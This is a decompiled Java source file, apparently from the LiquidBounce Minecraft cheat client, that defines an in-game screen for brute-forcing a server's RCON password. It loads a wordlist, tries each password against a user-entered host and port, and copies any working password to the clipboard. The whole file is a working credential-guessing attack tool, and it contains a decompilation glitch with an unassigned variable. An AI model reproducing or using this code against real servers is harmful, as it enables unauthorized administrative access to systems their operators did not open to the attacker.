//Deobfuscated with https://github.com/PetoPetko/Minecraft-Deobfuscator3000 using mappings "mcp_stable-22-1.8.9 (1)"!

// 
// Decompiled by Procyon v0.5.36
// 

package net.ccbluex.liquidbounce.ui.tools;

import java.io.IOException;
import java.io.File;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.FileReader;
import java.awt.HeadlessException;
import javax.swing.JDialog;
import java.awt.Component;
import javax.swing.JFileChooser;
import net.minecraft.client.gui.FontRenderer;
import net.ccbluex.liquidbounce.ui.font.Fonts;
import org.lwjgl.input.Keyboard;
import net.kronos.rkon.core.exceptions.AuthenticationException;
import java.awt.datatransfer.ClipboardOwner;
import java.awt.datatransfer.Transferable;
import java.awt.datatransfer.StringSelection;
import java.awt.Toolkit;
import net.kronos.rkon.core.Rcon;
import java.util.ArrayList;
import java.util.List;
import net.ccbluex.liquidbounce.utils.threading.ToggleableLoop;
import net.minecraft.client.gui.GuiButton;
import net.minecraft.client.gui.GuiTextField;
import net.minecraft.client.gui.GuiScreen;

public class GuiRconBruteforce extends GuiScreen
{
    private GuiTextField ipField;
    private GuiButton buttonToggle;
    private ToggleableLoop thread;
    private final GuiScreen prevGui;
    private final List<String> passwordList;
    private int index;
    private int pps;
    private int ppsDisplay;
    private long prevReset;
    private String status;
    
    public GuiRconBruteforce(final GuiScreen prevGui) {
        this.passwordList = new ArrayList<String>();
        this.status = "§7Wating...";
        this.prevGui = prevGui;
        String[] ip;
        String password;
        final Rcon rcon2;
        Rcon rcon;
        this.thread = new ToggleableLoop(() -> {
            try {
                if (this.index < this.passwordList.size()) {
                    ip = this.ipField.getText().split(":");
                    password = this.passwordList.get(this.index);
                    this.status = "§cTesting §a§l" + password + " §c on §a§l" + ip[0] + ":" + ((ip.length <= 1) ? "25575" : ip[1]) + " §7(§c" + this.index + "/" + this.passwordList.size() + "§7)";
                    try {
                        new Rcon(ip[0], (ip.length <= 1) ? 25575 : Integer.parseInt(ip[1]), password.getBytes("UTF-8"));
                        rcon = rcon2;
                        rcon.disconnect();
                        this.status = "§cPassword: §a§l" + password;
                        Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(password), null);
                        this.thread.stopThread();
                    }
                    catch (AuthenticationException ex) {}
                    catch (Exception e) {
                        this.status = "§a§l" + e.getClass().getSimpleName() + ": §c" + e.getMessage();
                    }
                    ++this.pps;
                    if (System.currentTimeMillis() - this.prevReset > 1000L) {
                        this.ppsDisplay = this.pps;
                        this.pps = 0;
                        this.prevReset = System.currentTimeMillis();
                    }
                }
                else {
                    this.thread.stopThread();
                    this.status = "§a§lNo password found.";
                }
                ++this.index;
            }
            catch (Exception e2) {
                this.status = "§a§l" + e2.getClass().getSimpleName() + ": §c" + e2.getMessage();
            }
        }, "RCON-BruteForce");
    }
    
    public void initGui() {
        Keyboard.enableRepeatEvents(true);
        (this.ipField = new GuiTextField(3, (FontRenderer)Fonts.font40, this.width / 2 - 100, 60, 200, 20)).setFocused(true);
        this.ipField.setMaxStringLength(Integer.MAX_VALUE);
        this.buttonList.add(this.buttonToggle = new GuiButton(1, this.width / 2 - 100, this.height / 4 + 72, this.thread.isRunning() ? "Stop" : "Start"));
        this.buttonList.add(new GuiButton(2, this.width / 2 - 100, this.height / 4 + 96, "Choose password list"));
        this.buttonList.add(new GuiButton(0, this.width / 2 - 100, this.height / 4 + 120, "Back"));
        super.initGui();
    }
    
    public void drawScreen(final int mouseX, final int mouseY, final float partialTicks) {
        this.drawBackground(0);
        this.drawCenteredString((FontRenderer)Fonts.font40, "BruteForce (RCON)", this.width / 2, 34, 16777215);
        this.drawCenteredString((FontRenderer)Fonts.font35, (this.status == null) ? "" : this.status, this.width / 2, this.height / 4 + 50, 16777215);
        this.drawCenteredString((FontRenderer)Fonts.font35, "PPS: " + this.ppsDisplay, this.width / 2, this.height / 4 + 60, 16777215);
        this.buttonToggle.displayString = (this.thread.isRunning() ? "Stop" : "Start");
        this.ipField.drawTextBox();
        super.drawScreen(mouseX, mouseY, partialTicks);
    }
    
    protected void actionPerformed(final GuiButton button) throws IOException {
        switch (button.id) {
            case 0: {
                this.mc.displayGuiScreen(this.prevGui);
                break;
            }
            case 1: {
                this.index = 0;
                if (this.thread.isRunning()) {
                    this.thread.stopThread();
                }
                else {
                    this.thread.startThread();
                }
                this.buttonToggle.displayString = (this.thread.isRunning() ? "Stop" : "Start");
                this.pps = 0;
                this.ppsDisplay = 0;
                break;
            }
            case 2: {
                final JFileChooser jFileChooser = new JFileChooser() {
                    @Override
                    protected JDialog createDialog(final Component parent) throws HeadlessException {
                        final JDialog jDialog = super.createDialog(parent);
                        jDialog.setAlwaysOnTop(true);
                        return jDialog;
                    }
                };
                jFileChooser.setFileSelectionMode(0);
                if (jFileChooser.showOpenDialog(null) != 0) {
                    break;
                }
                final File file = jFileChooser.getSelectedFile();
                if (file.isDirectory()) {
                    return;
                }
                final BufferedReader bufferedReader = new BufferedReader(new FileReader(file));
                synchronized (this.passwordList) {
                    this.passwordList.clear();
                }
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    synchronized (this.passwordList) {
                        this.passwordList.add(line);
                    }
                }
                bufferedReader.close();
                break;
            }
        }
        super.actionPerformed(button);
    }
    
    protected void keyTyped(final char typedChar, final int keyCode) throws IOException {
        if (1 == keyCode) {
            this.mc.displayGuiScreen(this.prevGui);
            return;
        }
        if (this.ipField.isFocused()) {
            this.ipField.textboxKeyTyped(typedChar, keyCode);
        }
        super.keyTyped(typedChar, keyCode);
    }
    
    protected void mouseClicked(final int mouseX, final int mouseY, final int mouseButton) throws IOException {
        this.ipField.mouseClicked(mouseX, mouseY, mouseButton);
        super.mouseClicked(mouseX, mouseY, mouseButton);
    }
    
    public void onGuiClosed() {
        Keyboard.enableRepeatEvents(false);
        this.thread.stopThread();
        super.onGuiClosed();
    }
}
